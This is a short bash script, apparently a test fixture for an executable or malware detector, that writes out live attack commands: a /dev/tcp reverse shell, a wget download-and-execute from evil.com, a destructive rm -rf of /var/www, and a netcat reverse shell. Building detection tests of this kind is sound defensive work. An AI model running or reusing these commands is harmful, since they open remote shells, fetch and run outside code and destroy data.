#!/bin/bash
# TEST FILE: Malicious shell script
# This should trigger: executable detector

# Reverse shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Download and execute
wget http://evil.com/payload.sh -O /tmp/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh

# Dangerous commands
rm -rf /var/www/*

# Netcat reverse shell
nc -e /bin/bash 192.168.1.100 4444
